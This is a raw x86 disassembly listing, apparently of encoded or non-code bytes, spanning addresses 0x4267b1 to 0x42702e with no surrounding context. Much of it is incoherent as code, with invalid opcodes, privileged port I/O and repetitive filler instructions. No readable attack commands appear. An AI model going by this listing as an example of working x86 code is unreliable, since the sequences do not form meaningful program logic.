  4267b1:	cmp    cl,BYTE PTR [ebp+0x194f7c8d]
  4267b7:	dec    ebp
  4267b8:	dec    ebp
  4267b9:	dec    ebp
  4267ba:	sar    ch,cl
  4267bc:	sbb    al,0x38
  4267be:	dec    ebp
  4267bf:	add    DWORD PTR [eax-0x8b2ea89],0x808b7750
  4267c9:	ja     0x426756
  4267cb:	dec    edi
  4267cc:	push   0xffffffd5
  4267ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267cf:	mov    ds:0x1d4c6957,al
  4267d4:	in     eax,dx
  4267d5:	fstp   st(0)
  4267d7:	mov    esp,0x21f08076
  4267dc:	adc    BYTE PTR [edi+0x530de221],0x51
  4267e3:	popf   
  4267e4:	push   ebx
  4267e5:	div    DWORD PTR [edx-0x414dd608]
  4267eb:	or     al,0xff
  4267ed:	inc    BYTE PTR [eax-0x2e7f3769]
  4267f3:	cmp    cl,BYTE PTR es:[ebp+0x9a65f8d]
  4267fa:	dec    edi
  4267fb:	push   0x808d8d2f
  426800:	lock and DWORD PTR [eax+0x51532197],eax
  426807:	mov    dl,0xbe
  426809:	or     al,0x53
  42680b:	div    DWORD PTR [edx-0x100d608]
  426811:	adc    BYTE PTR [edi-0x1a2e7f38],0x3a
  426818:	lea    ecx,[ebp-0xf7f59b0]
  42681e:	and    DWORD PTR [eax+0x51532197],eax
  426824:	mov    dl,0xbe
  426826:	or     al,0x53
  426828:	div    DWORD PTR [edx-0x100d608]
  42682e:	adc    BYTE PTR [edi-0x322e7f38],0x3a
  426835:	lea    ecx,[ebp+0x6760a650]
  42683b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426841:	and    eax,0x804d4d4d
  426846:	adc    DWORD PTR [ecx+0x4d290150],edi
  42684c:	dec    ebp
  42684d:	dec    ebp
  42684e:	pusha  
  42684f:	daa    
  426850:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426856:	sub    eax,0x604d4d4d
  42685b:	sub    BYTE PTR [eax],bh
  42685d:	lea    ecx,[ebp-0x3ffeaf47]
  426863:	dec    ebp
  426864:	dec    ebp
  426865:	dec    ebp
  426866:	in     eax,dx
  426867:	mov    dl,0x4
  426869:	mov    ecx,0x4d350150
  42686e:	dec    ebp
  42686f:	dec    ebp
  426870:	pusha  
  426871:	adc    al,0x38
  426873:	lea    ecx,[ebp+0x390150b9]
  426879:	dec    ebp
  42687a:	dec    ebp
  42687b:	dec    ebp
  42687c:	in     eax,dx
  42687d:	mov    dl,0xf3
  42687f:	mov    ecx,0x4d3d0150
  426884:	dec    ebp
  426885:	dec    ebp
  426886:	pusha  
  426887:	sbb    al,0x38
  426889:	lea    ecx,[ebp-0x2dfeaf47]
  42688f:	dec    ebp
  426890:	dec    ebp
  426891:	dec    ebp
  426892:	adc    BYTE PTR [ecx],0xb9
  426895:	push   eax
  426896:	add    DWORD PTR [ebp+0x4d],eax
  426899:	dec    ebp
  42689a:	dec    ebp
  42689b:	pusha  
  42689c:	sbb    BYTE PTR [eax],bh
  42689e:	lea    ecx,[ebp+0x490150b9]
  4268a4:	dec    ebp
  4268a5:	dec    ebp
  4268a6:	dec    ebp
  4268a7:	pusha  
  4268a8:	daa    
  4268a9:	pop    ebp
  4268aa:	lea    ecx,[ebp-0x7efeaf47]
  4268b0:	dec    ebp
  4268b1:	dec    ebp
  4268b2:	dec    ebp
  4268b3:	pusha  
  4268b4:	push   ebx
  4268b5:	xor    ecx,DWORD PTR [ebp+0x150b98d]
  4268bb:	aam    0x4d
  4268bd:	dec    ebp
  4268be:	dec    ebp
  4268bf:	cld    
  4268c0:	ja     0x426845
  4268c2:	mov    ds:0x8d185d60,eax
  4268c7:	lea    edi,[ecx+0x4d550150]
  4268cd:	dec    ebp
  4268ce:	dec    ebp
  4268cf:	in     eax,dx
  4268d0:	mov    dl,0x5d
  4268d2:	mov    ecx,0x4d590150
  4268d7:	dec    ebp
  4268d8:	dec    ebp
  4268d9:	cld    
  4268da:	ja     0x426884
  4268dc:	or     bh,ah
  4268de:	ja     0x4268e4
  4268e0:	xchg   ebp,eax
  4268e1:	cld    
  4268e2:	ja     0x426890
  4268e4:	stos   DWORD PTR es:[edi],eax
  4268e5:	pusha  
  4268e6:	(bad)  
  4268e8:	lea    ecx,[ebp+0x5d0150b9]
  4268ee:	dec    ebp
  4268ef:	dec    ebp
  4268f0:	dec    ebp
  4268f1:	cld    
  4268f2:	ja     0x426878
  4268f4:	jg     0x426956
  4268f6:	fistp  DWORD PTR [eax-0x73]
  4268f9:	lea    edi,[ecx+0x4dd60150]
  4268ff:	dec    ebp
  426900:	dec    ebp
  426901:	cld    
  426902:	ja     0x4268be
  426904:	popf   
  426905:	cld    
  426906:	ja     0x426900
  426908:	xchg   esi,eax
  426909:	pusha  
  42690a:	inc    edx
  42690b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426911:	gs dec ebp
  426913:	dec    ebp
  426914:	dec    ebp
  426915:	cld    
  426916:	ja     0x4268cc
  426918:	xchg   BYTE PTR [eax-0x687f8e10],al
  42691e:	jno    0x426973
  426920:	push   ecx
  426921:	push   ebx
  426922:	div    DWORD PTR [edx-0x74df342]
  426928:	sub    edi,edi
  42692a:	inc    ah
  42692c:	fwait
  42692d:	adc    BYTE PTR [edi+0x71e78071],0x53
  426934:	jle    0x4268e8
  426936:	pop    es
  426937:	or     al,0x53
  426939:	mov    esi,DWORD PTR [edx-0x6300d644]
  42693f:	inc    ebx
  426940:	dec    BYTE PTR [ecx]
  426942:	loopne 0x426975
  426944:	iret   
  426945:	add    DWORD PTR [eax-0x187f8e69],0x71
  42694c:	push   ebx
  42694d:	jle    0x426901
  42694f:	pop    es
  426950:	or     al,0x53
  426952:	mov    esi,DWORD PTR [edx-0x6300d644]
  426958:	and    bh,0x8b
  42695b:	mov    ds:0x8d8dcd05,al
  426960:	lea    esp,[edx-0x7272e14e]
  426966:	lea    eax,[ebx-0x7b]
  426969:	adc    BYTE PTR [ecx],dh
  42696b:	add    DWORD PTR [bx+si+0x7197],0xffffff80
  426971:	lock jno 0x4269c7
  426974:	jle    0x4269c9
  426976:	std    
  426977:	mov    dl,0xba
  426979:	sub    DWORD PTR [edx-0x4900f3f9],esi
  42697f:	xor    al,0x8b
  426982:	in     al,dx
  426983:	inc    BYTE PTR [eax-0x187f8e69]
  426989:	jno    0x4269de
  42698b:	jle    0x4269e0
  42698d:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426993:	sub    edi,edi
  426995:	pushf  
  426996:	in     eax,dx
  426997:	sti    
  426998:	out    dx,eax
  426999:	push   eax
  42699a:	lock mov esp,DWORD PTR [ebx-0x2]
  42699e:	in     al,0x1
  4269a0:	xor    al,0x71
  4269a3:	adc    BYTE PTR [edi+0x53515371],0xf7
  4269aa:	mov    dl,0xbe
  4269ac:	or     al,0xb2
  4269ae:	clc    
  4269af:	sub    edi,edi
  4269b1:	(bad)  
  4269b2:	push   eax
  4269b3:	add    DWORD PTR [esi],edx
  4269b5:	or     eax,0xf0804d4d
  4269ba:	and    DWORD PTR [eax+0x51532197],eax
  4269c0:	push   ebx
  4269c1:	div    DWORD PTR [edx-0x414dd608]
  4269c7:	or     al,0xff
  4269c9:	inc    BYTE PTR [ecx]
  4269cb:	xchg   edi,eax
  4269cc:	adc    DWORD PTR [eax+0x16],0x1
  4269d0:	push   ds
  4269d1:	or     eax,0xb3f14d4d
  4269d6:	cmp    BYTE PTR [ebp-0x46017f73],cl
  4269dc:	push   eax
  4269dd:	lock es in eax,dx
  4269e0:	mov    dl,0xfb
  4269e2:	or     bl,0xb9
  4269e5:	push   eax
  4269e6:	out    0xf2,eax
  4269e8:	add    esi,esp
  4269ea:	add    al,0xb9
  4269ec:	push   eax
  4269ed:	out    0x2e,eax
  4269ef:	in     eax,dx
  4269f0:	jl     0x4269e0
  4269f2:	mov    ecx,0x1f3e750
  4269f7:	out    0x15,al
  4269f9:	mov    ecx,0xed36e750
  4269fe:	jl     0x426a03
  426a00:	mov    ecx,0x80f4e750
  426a05:	retf   
  426a06:	mov    ecx,0x803ee750
  426a0b:	test   DWORD PTR [ecx-0x7f0a18b0],edi
  426a11:	push   es
  426a12:	mov    ecx,0x8046e750
  426a17:	test   DWORD PTR [ecx-0x7f9d18b0],edi
  426a1d:	retf   
  426a1e:	mov    ecx,0x1dee750
  426a23:	out    0xf2,al
  426a25:	mov    ecx,0xed56e750
  426a2a:	jl     0x426a1a
  426a2c:	mov    ecx,0x1e0e750
  426a31:	out    0x7a,al
  426a33:	mov    ecx,0xed5ee750
  426a38:	jl     0x426a3d
  426a3a:	mov    ecx,0xb9f1e750
  426a3f:	push   eax
  426a40:	lock mov cx,0x9750
  426a45:	cli    
  426a46:	adc    BYTE PTR [ecx],0xb9
  426a49:	push   eax
  426a4a:	lock push 0xffffff80
  426a4d:	lock and DWORD PTR [eax-0x8acde69],eax
  426a54:	push   ebx
  426a55:	push   ecx
  426a56:	mov    dl,0xf8
  426a58:	sub    DWORD PTR [edx-0x100f342],esi
  426a5e:	adc    BYTE PTR [edi+0x21e78021],0x53
  426a65:	jle    0x426a19
  426a67:	pop    es
  426a68:	or     al,0x1
  426a6a:	xor    eax,esi
  426a6c:	bound  edx,QWORD PTR [ebx-0x75]
  426a6f:	mov    dl,0xbc
  426a71:	sub    edi,edi
  426a73:	pushf  
  426a74:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426a78:	pushf  
  426a79:	mov    ecx,0xf0800e50
  426a7e:	and    DWORD PTR [eax+0x51532197],eax
  426a84:	push   ebx
  426a85:	div    DWORD PTR [edx-0x74df342]
  426a8b:	sub    edi,edi
  426a8d:	inc    BYTE PTR [eax+0x31012197]
  426a93:	lock es push ebx
  426a96:	jle    0x426a18
  426a98:	out    0x21,eax
  426a9a:	mov    dl,0x7
  426a9c:	or     al,0x53
  426a9e:	mov    esi,DWORD PTR [edx-0x6300d644]
  426aa4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426aa8:	pushf  
  426aa9:	mov    ecx,0xf0800e50
  426aae:	and    DWORD PTR [eax-0x8acde69],eax
  426ab4:	mov    dl,0xf8
  426ab6:	sub    DWORD PTR [ebx+0x51],edx
  426ab9:	mov    dl,0xbe
  426abb:	or     al,0xff
  426abd:	inc    BYTE PTR [eax-0x187fde69]
  426ac3:	and    DWORD PTR [ebx+0x7e],edx
  426ac6:	mov    dl,0x7
  426ac8:	or     al,0x53
  426aca:	mov    esi,DWORD PTR [edx-0x6300d644]
  426ad0:	mov    ecx,0x52974150
  426ad5:	or     eax,0xf0804d4d
  426ada:	and    DWORD PTR [eax-0x8acde69],eax
  426ae0:	mov    dl,0xf8
  426ae2:	sub    DWORD PTR [ebx+0x51],edx
  426ae5:	mov    dl,0xbe
  426ae7:	or     al,0xff
  426ae9:	inc    BYTE PTR [eax-0x187fde69]
  426aef:	and    DWORD PTR [ebx+0x7e],edx
  426af2:	mov    dl,0x7
  426af4:	or     al,0x53
  426af6:	mov    esi,DWORD PTR [edx-0x6300d644]
  426afc:	mov    ecx,0xa5974150
  426b01:	or     eax,0xf0804d4d
  426b06:	jno    0x426a88
  426b08:	xchg   edi,eax
  426b09:	jno    0x426b5e
  426b0b:	not    DWORD PTR [ebx+0x51]
  426b0e:	mov    dl,0xf8
  426b10:	sub    DWORD PTR [edx-0x100f342],esi
  426b16:	adc    BYTE PTR [edi+0x71e78071],0x53
  426b1d:	jle    0x426b72
  426b1f:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426b25:	sub    edi,edi
  426b27:	pushf  
  426b28:	in     al,dx
  426b29:	(bad)  
  426b2a:	push   eax
  426b2b:	add    DWORD PTR [esi],edx
  426b2d:	or     eax,0xf0804d4d
  426b32:	and    DWORD PTR [eax-0x187fde69],eax
  426b38:	out    dx,eax
  426b39:	push   ebx
  426b3a:	not    DWORD PTR [ebx+0x51]
  426b3d:	mov    dl,0xbe
  426b3f:	or     al,0xb2
  426b41:	clc    
  426b42:	sub    edi,edi
  426b44:	inc    BYTE PTR [ecx]
  426b46:	dec    edi
  426b47:	push   edx
  426b48:	or     eax,0xf504d4d
  426b4d:	add    DWORD PTR [esi],ebx
  426b4f:	or     eax,0x77014d4d
  426b54:	bound  eax,QWORD PTR [esi+0x4d4d61d3]
  426b5a:	xor    al,0x71
  426b5d:	adc    BYTE PTR [edi+0x530de271],0x51
  426b64:	stos   DWORD PTR es:[edi],eax
  426b65:	push   ebx
  426b66:	pushf  
  426b67:	mov    dl,0xbe
  426b69:	or     al,0xb2
  426b6b:	clc    
  426b6c:	sub    edi,edi
  426b6e:	(bad)  
  426b6f:	push   eax
  426b70:	lidtd  [esi]
  426b73:	or     eax,0x77804d4d
  426b78:	and    DWORD PTR [eax-0x3acde10],eax
  426b7e:	mov    dl,0x86
  426b80:	or     al,0x53
  426b82:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426b88:	aad    0x3d
  426b8a:	add    DWORD PTR [edi+0x16],ecx
  426b8d:	or     eax,0x800a4d4d
  426b92:	ja     0x426c05
  426b94:	xor    al,0x71
  426b97:	push   ebx
  426b98:	cld    
  426b99:	mov    dl,0x86
  426b9b:	or     al,0x53
  426b9d:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426ba3:	or     al,BYTE PTR [ecx]
  426ba5:	dec    edi
  426ba6:	and    eax,0xa4d4d4d
  426bab:	xor    BYTE PTR [edi+0x15],0xe2
  426baf:	lea    ecx,[ebp-0x9]
  426bb2:	xor    BYTE PTR [edi+0x21],0x80
  426bb6:	lock and DWORD PTR [ebx-0x4],edx
  426bba:	push   ebx
  426bbb:	sub    al,BYTE PTR [eax-0x794d1019]
  426bc1:	or     al,0xb2
  426bc3:	mov    edx,0x1b2ff29
  426bc8:	add    DWORD PTR [ebp+0x504d4d0d],esp
  426bce:	inc    ecx
  426bcf:	dec    edi
  426bd0:	push   ds
  426bd1:	or     eax,0x77014d4d
  426bd6:	xchg   BYTE PTR es:0x804d4d88,al
  426bdd:	lock jno 0x426b60
  426be0:	xchg   edi,eax
  426be1:	jno    0x426c36
  426be3:	push   ecx
  426be4:	mov    dl,0xbe
  426be6:	or     al,0xed
  426be8:	ret    0xb20d
  426beb:	clc    
  426bec:	sub    edi,edi
  426bee:	(bad)  
  426bef:	push   eax
  426bf0:	lidtd  [esi]
  426bf3:	or     eax,0x33f14d4d
  426bf8:	cmp    BYTE PTR [ebp+0x386b5e8d],cl
  426bfe:	lea    ecx,[ebp+0xa4f50b9]
  426c04:	dec    ebp
  426c05:	dec    ebp
  426c06:	dec    ebp
  426c07:	add    edx,ebx
  426c09:	jno    0x426bc4
  426c0b:	push   eax
  426c0c:	add    DWORD PTR [ebp+0x5e4d4d4d],esi
  426c12:	popa   
  426c13:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426c19:	stos   BYTE PTR es:[edi],al
  426c1a:	dec    ebp
  426c1b:	dec    ebp
  426c1c:	dec    ebp
  426c1d:	cmp    bl,0xb9
  426c20:	push   eax
  426c21:	dec    edi
  426c22:	xchg   ebp,eax
  426c23:	dec    ebp
  426c24:	dec    ebp
  426c25:	dec    ebp
  426c26:	xor    BYTE PTR [edx-0x66b0af47],0x4d
  426c2d:	dec    ebp
  426c2e:	dec    ebp
  426c2f:	in     eax,dx
  426c30:	push   0x29
  426c32:	cmp    ch,0xb9
  426c35:	push   eax
  426c36:	add    DWORD PTR [ecx+0x14d4d4d],edi
  426c3c:	fisubr DWORD PTR [ecx]
  426c3e:	mov    ecx,0x4dbd0150
  426c43:	dec    ebp
  426c44:	dec    ebp
  426c45:	in     eax,dx
  426c46:	mov    dl,0xd6
  426c48:	mov    ecx,0x4de20150
  426c4d:	dec    ebp
  426c4e:	dec    ebp
  426c4f:	add    edx,ebx
  426c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c52:	mov    ecx,0x4dc50150
  426c57:	dec    ebp
  426c58:	dec    ebp
  426c59:	or     BYTE PTR [ebx-0x6297af47],0x4d
  426c60:	dec    ebp
  426c61:	dec    ebp
  426c62:	add    esi,esp
  426c64:	scas   al,BYTE PTR es:[edi]
  426c65:	pusha  
  426c66:	dec    ebp
  426c67:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426c6d:	ror    DWORD PTR [ebp+0x4d],0x4d
  426c71:	add    edx,ebx
  426c73:	or     eax,0x520150b9
  426c78:	dec    ebp
  426c79:	dec    ebp
  426c7a:	dec    ebp
  426c7b:	mov    ecx,0x4dae6850
  426c80:	dec    ebp
  426c81:	dec    ebp
  426c82:	in     eax,dx
  426c83:	jl     0x426c10
  426c85:	mov    ecx,0x4da56850
  426c8a:	dec    ebp
  426c8b:	dec    ebp
  426c8c:	or     BYTE PTR [ebx-0x72c783a0],0x8d
  426c93:	mov    ecx,0x4de40150
  426c98:	dec    ebp
  426c99:	dec    ebp
  426c9a:	cmp    ch,0xb9
  426c9d:	push   eax
  426c9e:	add    ebp,edx
  426ca0:	dec    ebp
  426ca1:	dec    ebp
  426ca2:	dec    ebp
  426ca3:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426ca8:	out    0x4d,al
  426caa:	dec    ebp
  426cab:	dec    ebp
  426cac:	push   ebx
  426cad:	push   0xffffffb9
  426caf:	push   eax
  426cb0:	push   0x4d4d4da9
  426cb5:	add    DWORD PTR [eax-0x1b],ebp
  426cb8:	dec    ebp
  426cb9:	dec    ebp
  426cba:	dec    ebp
  426cbb:	jl     0x426d0c
  426cbd:	lods   eax,DWORD PTR ds:[esi]
  426cbe:	dec    ebp
  426cbf:	dec    ebp
  426cc0:	dec    ebp
  426cc1:	out    0x38,eax
  426cc3:	xor    edi,DWORD PTR [eax]
  426cc5:	jl     0x426d16
  426cc7:	(bad)  [ebp+0x4d]
  426cca:	dec    ebp
  426ccb:	ret    
  426ccc:	cmp    BYTE PTR [esi-0x7fbb46c8],dl
  426cd2:	ja     0x426d45
  426cd4:	xor    al,0x71
  426cd7:	adc    BYTE PTR [edi+0xd05ed71],0xb2
  426cde:	mov    edx,0xb2fc5329
  426ce3:	xchg   BYTE PTR [edi+edi*8],cl
  426ce6:	mov    dl,0x80
  426ce8:	lock jno 0x426cd8
  426ceb:	add    eax,0xb27e530d
  426cf0:	mov    edx,0xc07b229
  426cf5:	push   DWORD PTR [esi-0x4128fad]
  426cfb:	sbb    edx,DWORD PTR [ebx]
  426cfd:	jo     0x426d52
  426cff:	dec    ebp
  426d00:	arpl   bx,cx
  426d02:	or     esi,ecx
  426d04:	and    cl,BYTE PTR [ebp-0x101b7273]
  426d0a:	arpl   bx,di
  426d0c:	or     ebp,ebp
  426d0e:	cmp    BYTE PTR [ebp-0xf7f7273],cl
  426d14:	jno    0x426c96
  426d16:	xchg   edi,eax
  426d17:	jno    0x426d6c
  426d19:	push   ecx
  426d1a:	mov    dl,0xbe
  426d1c:	or     al,0xed
  426d1e:	ret    0xb20d
  426d21:	clc    
  426d22:	sub    edi,edi
  426d24:	(bad)  
  426d25:	in     al,dx
  426d26:	std    
  426d27:	adc    BYTE PTR [ecx+edi*4+0xaf01653],0x4d
  426d2f:	dec    ebp
  426d30:	dec    ebp
  426d31:	xor    al,0x71
  426d34:	and    bh,0x71
  426d37:	push   ebx
  426d38:	push   ecx
  426d39:	mov    dl,0xbe
  426d3b:	or     al,0xed
  426d3d:	dec    ebx
  426d3e:	or     eax,0xff29bcb2
  426d43:	sub    ch,ah
  426d45:	std    
  426d46:	mov    ecx,0xaf04180
  426d4b:	dec    ebp
  426d4c:	dec    ebp
  426d4d:	dec    ebp
  426d4e:	mov    ecx,0xb2b9b64b
  426d53:	mov    edx,0x7b6b909
  426d58:	mov    ecx,0xf080b6ff
  426d5d:	jno    0x426cdf
  426d5f:	out    0x71,eax
  426d61:	push   ebx
  426d62:	push   ecx
  426d63:	mov    dl,0xbe
  426d65:	or     al,0xed
  426d67:	dec    ebx
  426d68:	or     eax,0xff29bcb2
  426d6d:	sub    ch,ah
  426d6f:	std    
  426d70:	mov    ecx,0xaf01650
  426d75:	dec    ebp
  426d76:	dec    ebp
  426d77:	dec    ebp
  426d78:	xor    al,0x71
  426d7b:	adc    BYTE PTR [edi-0x12aeac8f],0xc2
  426d82:	or     eax,0xb20cbeb2
  426d87:	clc    
  426d88:	sub    edi,edi
  426d8a:	inc    BYTE PTR [eax-0x4d138e69]
  426d90:	xor    al,0x71
  426d93:	in     eax,dx
  426d94:	add    eax,0xb27e530d
  426d99:	mov    edx,0xc07b229
  426d9e:	push   DWORD PTR [esi-0x4128fad]
  426da4:	sbb    edx,DWORD PTR [ebx]
  426da6:	jo     0x426dfb
  426da8:	dec    ebp
  426da9:	arpl   bx,cx
  426dab:	or     edx,ebp
  426dad:	call   0x934c:0x94d4d4d
  426db4:	dec    ebp
  426db5:	dec    ebp
  426db6:	dec    ebp
  426db7:	ins    BYTE PTR es:[edi],dx
  426db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426db9:	mov    DWORD PTR [esp+edx*8],0x50767701
  426dc0:	ja     0x426db1
  426dc2:	xor    BYTE PTR [edi-0x11],0x64
  426dc6:	mov    ecx,0x5011df58
  426dcb:	sbb    eax,0x86ee6d7c
  426dd0:	pop    DWORD PTR [ebx+0x26]
  426dd3:	xor    BYTE PTR [edi+0x76],0x80
  426dd7:	lock std 
  426dd9:	or     DWORD PTR [esi-0x3],eax
  426ddc:	or     al,0xb2
  426dde:	mov    esi,0x76f0800c
  426de3:	adc    BYTE PTR [edi+0x537c53fd],0x72
  426dea:	push   edi
  426dec:	xor    BYTE PTR [edi-0x38],0xaa
  426df0:	das    
  426df1:	cmp    cl,BYTE PTR es:[ebp+0x4f010a8d]
  426df8:	enter  0x4d0d,0x4d
  426dfc:	or     dh,BYTE PTR [edx+0x778629ba]
  426e02:	mov    edx,0x77804d4d
  426e07:	xchg   DWORD PTR [eax+0x460932f0],eax
  426e0d:	std    
  426e0e:	or     al,0xb2
  426e10:	mov    esi,0x87f0800c
  426e15:	adc    BYTE PTR [edi+0x29bab232],0x80
  426e1c:	add    eax,ecx
  426e1e:	or     eax,0x30804d4d
  426e23:	push   ebx
  426e24:	jl     0x426e79
  426e26:	jb     0x426e27
  426e28:	sti    
  426e29:	arpl   bp,di
  426e2b:	or     DWORD PTR [edi+0x56],ecx
  426e2e:	lea    ecx,[ebp-0x37287f73]
  426e34:	jl     0x426ead
  426e36:	scas   eax,DWORD PTR es:[edi]
  426e37:	fst    DWORD PTR [edi-0x21]
  426e3a:	adc    DWORD PTR [esi-0x7a],ebx
  426e3d:	pop    DWORD PTR [ebx+0x26]
  426e40:	push   eax
  426e41:	ja     0x426e3a
  426e43:	push   eax
  426e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e45:	jp     0x426e97
  426e47:	ja     0x426dcb
  426e49:	xor    BYTE PTR [edi+0x7a],0x80
  426e4d:	lock or BYTE PTR [ecx],0x46
  426e51:	std    
  426e52:	or     al,0xb2
  426e54:	mov    esi,0x7af0800c
  426e59:	adc    BYTE PTR [edi+0x537c5382],0x72
  426e60:	push   edi
  426e62:	stos   BYTE PTR es:[edi],al
  426e63:	dec    ebp
  426e64:	xlat   BYTE PTR ds:[ebx]
  426e65:	xor    eax,0x4d29bab2
  426e6a:	loopne 0x426ea2
  426e6c:	cmp    cl,BYTE PTR [ebp-0x7b817973]
  426e72:	dec    ebp
  426e73:	dec    ebp
  426e74:	xor    BYTE PTR [edi+0x7a],0x80
  426e78:	lock or BYTE PTR [ecx],0x46
  426e7c:	std    
  426e7d:	or     al,0xb2
  426e7f:	mov    esi,0x7af0800c
  426e84:	adc    BYTE PTR [edi+0x537c5382],0x72
  426e8b:	push   edi
  426e8d:	stos   BYTE PTR es:[edi],al
  426e8e:	dec    ebp
  426e8f:	loopne 0x426ec7
  426e91:	cmp    cl,BYTE PTR [ebp+0x29bab28d]
  426e97:	dec    ebp
  426e98:	loopne 0x426ec8
  426e9a:	cmp    cl,BYTE PTR [ebp-0x7bc17973]
  426ea0:	dec    ebp
  426ea1:	dec    ebp
  426ea2:	or     BYTE PTR [esi+esi*1+0x3a],0x8d
  426ea7:	lea    eax,[eax+0x657f80ef]
  426ead:	in     al,dx
  426eae:	out    dx,eax
  426eaf:	push   eax
  426eb0:	lock out dx,eax
  426eb2:	xor    al,0xaf
  426eb5:	xor    BYTE PTR [edi-0x9],0x9
  426eb9:	inc    esi
  426eba:	mov    dl,0xc
  426ebc:	mov    dl,0x86
  426ebe:	or     al,0x80
  426ec0:	ja     0x426e71
  426ec2:	adc    BYTE PTR [edi-0x4dd5ac09],0x84
  426ec9:	sub    DWORD PTR [ebx+0x6a],edx
  426ecc:	push   DWORD PTR [edx+0x9eff080]
  426ed2:	pop    esp
  426ed3:	jg     0x426eee
  426ed5:	dec    edi
  426ed6:	std    
  426ed7:	aad    0x21
  426ed9:	or     BYTE PTR [edx+eax*4+0x3a],0x8d
  426ede:	lea    edi,[ebp+ecx*4-0xb]
  426ee2:	and    al,0x6f
  426ee4:	cmp    BYTE PTR [eax+0x77802177],al
  426eea:	jno    0x426f39
  426eec:	xlat   BYTE PTR ds:[ebx]
  426eed:	cmp    eax,0x4dc8d74d
  426ef2:	xlat   BYTE PTR ds:[ebx]
  426ef3:	sub    eax,0x4d25d74d
  426ef8:	xlat   BYTE PTR ds:[ebx]
  426ef9:	sbb    eax,0x8615d74d
  426efe:	cmp    cl,al
  426f00:	dec    ebp
  426f01:	dec    ebp
  426f02:	push   eax
  426f03:	dec    edi
  426f04:	xor    cl,BYTE PTR ds:0x77804d4d
  426f0a:	cmp    eax,0x8d15dded
  426f0f:	aad    0x1b
  426f11:	xor    BYTE PTR [edi+0x3d],0xed
  426f15:	frstor ds:0x80a1d58d
  426f1b:	dec    edi
  426f1c:	xor    cl,BYTE PTR ds:0xf0804d4d
  426f22:	cmp    eax,0xc41d9250
  426f27:	dec    DWORD PTR [ebp-0x29]
  426f2a:	cmp    eax,0x86c8d74d
  426f2f:	mov    WORD PTR [edx+0x4d],gs
  426f32:	dec    ebp
  426f33:	stos   DWORD PTR es:[edi],eax
  426f34:	test   eax,0x35fb70a3
  426f39:	lea    edx,[edi-0x78127880]
  426f3f:	and    DWORD PTR [ecx-0x9748884],ebx
  426f45:	and    al,0x6f
  426f47:	cmp    BYTE PTR [edi+esi*2-0x38],bh
  426f4b:	cmc    
  426f4c:	and    al,0x6f
  426f4e:	cmp    BYTE PTR [eax-0x287f7489],al
  426f54:	mov    esp,edx
  426f56:	or     eax,0x6f242260
  426f5b:	cmp    BYTE PTR [ebx-0x4e],dl
  426f5e:	scas   al,BYTE PTR es:[edi]
  426f5f:	push   ebx
  426f60:	ret    0x86b2
  426f63:	or     al,0xb2
  426f65:	add    ch,BYTE PTR [ecx]
  426f67:	(bad)  
  426f68:	cld    
  426f69:	adc    bh,0xef
  426f6c:	arpl   WORD PTR [edx],si
  426f6e:	xor    BYTE PTR [edi-0x75],0x9
  426f72:	sete   BYTE PTR [ebp-0x287f7273]
  426f79:	mov    edx,DWORD PTR [ebx-0x4e]
  426f7c:	push   ebx
  426f7d:	ret    0x2b2
  426f80:	sub    DWORD PTR [edx-0x300f37a],esi
  426f86:	adc    bh,0x21
  426f89:	arpl   WORD PTR [edx],si
  426f8b:	or     DWORD PTR [edi],ecx
  426f8d:	loopne 0x426f1c
  426f8f:	lea    ecx,[ebp-0x7f8e8880]
  426f95:	xchg   edi,eax
  426f96:	and    DWORD PTR [eax+0x539befd7],eax
  426f9c:	dec    ebp
  426f9d:	push   eax
  426f9e:	ja     0x426f2b
  426fa0:	dec    edi
  426fa1:	jb     0x426fac
  426fa3:	cmovb  ecx,DWORD PTR [ebp-0x706c7273]
  426faa:	out    dx,al
  426fab:	pop    ebx
  426fac:	adc    BYTE PTR [edi+0x9],dh
  426faf:	cld    
  426fb0:	ja     0x426fff
  426fb2:	aad    0xfc
  426fb4:	ja     0x426fc9
  426fb6:	sbb    esp,edi
  426fb8:	ja     0x426fb9
  426fba:	ror    BYTE PTR [ecx],1
  426fbc:	loopne 0x427035
  426fbe:	dec    DWORD PTR [ecx]
  426fc0:	loopne 0x426f69
  426fc2:	adc    ecx,edi
  426fc4:	jp     0x426f53
  426fc6:	lea    ecx,[ebp-0x1ff68bcd]
  426fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fcd:	dec    ebp
  426fce:	xor    esi,DWORD PTR [eax+edx*1+0x77]
  426fd2:	mov    bh,ah
  426fd4:	ja     0x426fa2
  426fd6:	or     eax,0xd40d77fc
  426fdb:	cld    
  426fdc:	ja     0x42702b
  426fde:	jl     0x426fdc
  426fe0:	ja     0x426ff5
  426fe2:	sar    esp,cl
  426fe4:	ja     0x426fe5
  426fe6:	push   esp
  426fe7:	(bad)  
  426fe8:	ja     0x426fe9
  426fea:	(bad)  
  426feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fec:	adc    esp,DWORD PTR [esi+0x4da78f74]
  426ff2:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  426ff6:	or     eax,0xa78fc40b
  426ffb:	int3   
  426ffc:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427000:	mov    dl,dh
  427002:	sbb    bl,0x35
  427005:	in     eax,dx
  427006:	out    0x8b,eax
  427008:	lea    ecx,[ecx]
  42700a:	loopne 0x427083
  42700c:	or     edi,edx
  42700e:	or     DWORD PTR [edi-0x33],edx
  427011:	lea    ecx,[ebp-0x72e1d073]
  427017:	lea    ecx,[ebp-0x3bf688f0]
  42701d:	inc    DWORD PTR [edi+0x8]
  427020:	lea    ecx,[ebp+0x977108d]
  427026:	div    eax
  427028:	or     DWORD PTR [edi-0x11eff689],ecx
  42702e:	pop    ebx
